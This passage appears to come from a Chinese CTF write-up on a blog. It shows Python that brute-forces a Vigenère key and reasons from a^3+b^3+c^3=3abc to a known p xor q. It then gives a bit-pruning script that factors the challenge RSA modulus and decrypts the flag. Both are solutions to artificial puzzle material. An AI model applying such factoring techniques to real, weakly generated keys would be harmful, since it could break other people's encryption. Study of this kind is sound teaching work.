idx = (dicts.find(c) - k) % dicts_len</span><br><span class="line">            m = dicts[idx]</span><br><span class="line">            plaintext += m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext += c</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">cipher = <span class="string">&quot;cp=wmaunapgimjfpopeblvup=aywqygb&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(dicts,repeat=<span class="number">4</span>):</span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    key = tmp * <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;tellasecret&quot;</span> <span class="keyword">in</span> vigenere_decrypt(cipher,key):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;key = <span class="subst">&#123;key&#125;</span>,plaintext:<span class="subst">&#123;vigenere_decrypt(cipher,key)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>得到提示a&#x3D;secert</p>
<p>又因为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> a**<span class="number">3</span>+b**<span class="number">3</span>+c**<span class="number">3</span> == <span class="number">3</span>*a*b*c</span><br><span class="line">gift = secert**<span class="number">3</span> - <span class="number">9</span>*secert + <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(gift)</span><br></pre></td></tr></table></figure>

<p>对于assert语句，要么a+b+c&#x3D;0.要么a&#x3D;b&#x3D;c</p>
<p>显然a+b+c不可能为0，那么a&#x3D;b&#x3D;c.也就是说p^_q&#x3D;a,然后首尾剪枝即可。可以参考我的另一篇文章<a href="https://mi1n9.github.io/2024/07/17/%E5%89%AA%E6%9E%9D%E7%9B%B8%E5%85%B3/">剪枝相关 | 浮白载笔</a>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(<span class="number">1500</span>)</span><br><span class="line"></span><br><span class="line">pxorq = <span class="number">25289672915296952421286820568694528489788342353673740247988495109991492893326</span></span><br><span class="line">n = <span class="number">7688109450918412752403544831281002390909833419780604228031807748258766149305710928557842935597759373483911172486806200079137977020089610947423466744079981</span></span><br><span class="line">c = <span class="number">6470273779347221033316093386019083111753019159457126878637258794718443144439812725263309232245307744208957171971247518708231996986359926490571921925899978</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">pxorq = <span class="built_in">str</span>(<span class="built_in">bin</span>(pxorq)[<span class="number">2</span>:]).zfill(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">ph, qh, pl, ql</span>):</span><br><span class="line">    l = <span class="built_in">len</span>(ph)</span><br><span class="line">    tmp0 = ph + (<span class="number">256</span> - <span class="number">2</span> * l) * <span class="string">&quot;0&quot;</span> + pl</span><br><span class="line">    tmp1 = ph + (<span class="number">256</span> - <span class="number">2</span> * l) * <span class="string">&quot;1&quot;</span> + pl</span><br><span class="line">    tmq0 = qh + (<span class="number">256</span> - <span class="number">2</span> * l) * <span class="string">&quot;0&quot;</span> + ql</span><br><span class="line">    tmq1 = qh + (<span class="number">256</span> - <span class="number">2</span> * l) * <span class="string">&quot;1&quot;</span> + ql</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">int</span>(tmp0, <span class="number">2</span>) * <span class="built_in">int</span>(tmq0, <span class="number">2</span>) &gt; n):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">int</span>(tmp1, <span class="number">2</span>) * <span class="built_in">int</span>(tmq1, <span class="number">2</span>) &lt; n):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">int</span>(pl, <span class="number">2</span>) * <span class="built_in">int</span>(ql, <span class="number">2</span>) % (<span class="number">2</span> ** (l - <span class="number">1</span>)) != n % (<span class="number">2</span> ** (l - <span class="number">1</span>))):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l == <span class="number">128</span>):</span><br><span class="line">        pp0 = <span class="built_in">int</span>(tmp0, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> (n % pp0 == <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(pp0)</span><br><span class="line">            pf = pp0</span><br><span class="line">            qf = n // pp0</span><br><span class="line">            phi = (pf - <span class="number">1</span>) * (qf - <span class="number">1</span>)</span><br><span class="line">            d = inverse(e, phi)</span><br><span class="line">            m1 = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m1))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> (pxorq[l] == <span class="string">&quot;1&quot;</span> <span class="keyword">and</span> pxorq[<span class="number">255</span> - l] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">            find(ph + <span class="string">&quot;1&quot;</span>, qh + <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span> + pl, <span class="string">&quot;0&quot;</span> + ql)</span><br><span class="line">            find(ph + <span class="string">&quot;0&quot;</span>, qh + <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span> + pl, <span class="string">&quot;1&quot;</span> + ql)</span><br><span class="line">            find(ph + <span class="string">&quot;1&quot;</span>, qh + <span class="string">&quot;1&quot;</span>, <span class="string">&quot;0&quot;</span> + pl, <span class="string">&quot;0&quot;</span> + ql)</span><br><span class="line">            find(ph + <span class="string">&quot;0&quot;</span>, qh + <span class="string">&quot;1&quot;</span>, <span class="string">&quot;0&quot;</span> + pl, <span class="string">&quot;1&quot;</span> + ql)</span><br><span class="line">        <span class="keyword">elif</span> (pxorq[l] == <span class="string">&quot;1&quot;</span> <span class="keyword">and</span> pxorq[<span class="number">255</span> - l] == <span class="string">&quot;0&quot;</span>):</span><br><span class="line">            find(ph + <span class="string">&quot;1&quot;</span>, qh + <span class="string">&quot;0&quot;</span>, <span class="string">&quot;0&quot;</span> + pl, <span class="string">&quot;0&quot;</span> + ql)</span><br><span class="line">            find(ph + <span class="string">&quot;0&quot;</span>, qh + <span class="string">&quot;0&quot;</span>, <span class="string">&quot;0&quot;</span> + pl, <span class="string">&quot;1&quot;</span> + ql)</span><br><span class="line">            find(ph + <span class="string">&quot;1&quot;</span>, qh + <span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span> + pl, <span class="string">&quot;0&quot;</span> + ql)</span><br><span class="line">            find(ph + <span class="string">&quot;0&quot;</span>, qh + <span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span> + pl, <span class="string">&quot;1&quot;</span> + ql)</span><br><span class="line">        <span class="keyword">elif</span> (pxorq[l] == <span class="string">&quot;0&quot;</span> <span class="keyword">and</span> pxorq[<span class="number">255</span> - l] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">            find(ph + <span class="string">&quot;0&quot;</span>, qh + <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span> + pl, <span class="string">&quot;0&quot;</span> + ql)</span><br><span class="line">            find(ph + <span class="string">&quot;0&quot;</span>, qh + <span class="string">&quot;1&quot;</span>, <span class="string">&quot;0&quot;</span> + pl, <span class="string">&quot;0&quot;</span> + ql)</span><br><span class="line">            find(ph + <span class="string">&quot;1&quot;</span>, qh + <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span> + pl, <span class="string">&quot;1&quot;</span> + ql)</span><br><span class="line">            find(ph + <span class="string">&quot;1&quot;</span>, qh + <span class="string">&quot;1&quot;</span>, <span class="string">&quot;0&quot;</span> + pl, <span class="string">&quot;1&quot;</span> + ql)</span><br><span class="line">        <span class="keyword">elif</span> (pxorq[l] == <span class="string">&quot;0&quot;</span> <span class="keyword">and</span> pxorq[<span class="number">255</span> - l] == <span class="string">&quot;0&quot;</span>):</span><br><span class="line">            find(ph + <span class="string">&quot;0&quot;</span>, qh + <span class="string">&quot;0&quot;</span>, <span class="string">&quot;0&quot;</span> + pl, <span class="string">&quot;0&quot;</span> + ql)</span><br><span class="line">            find(ph + <span class="string">&quot;1&quot;</span>, qh + <span class="string">&quot;0&quot;</span>, <span class="string">&quot;0&quot;</span> + pl, <span class="string">&quot;1&quot;</span> + ql)</span><br><span class="line">            find(ph + <span class="string">&quot;0&quot;</span>, qh + <span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span> + pl, <span class="string">&quot;0&quot;</span> + ql)</span><br><span class="line">            find(ph + <span class="string">&quot;1&quot;</span>, qh + <span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span> + pl, <span class="string">&quot;1&quot;</span> + ql)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">find(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
</search>
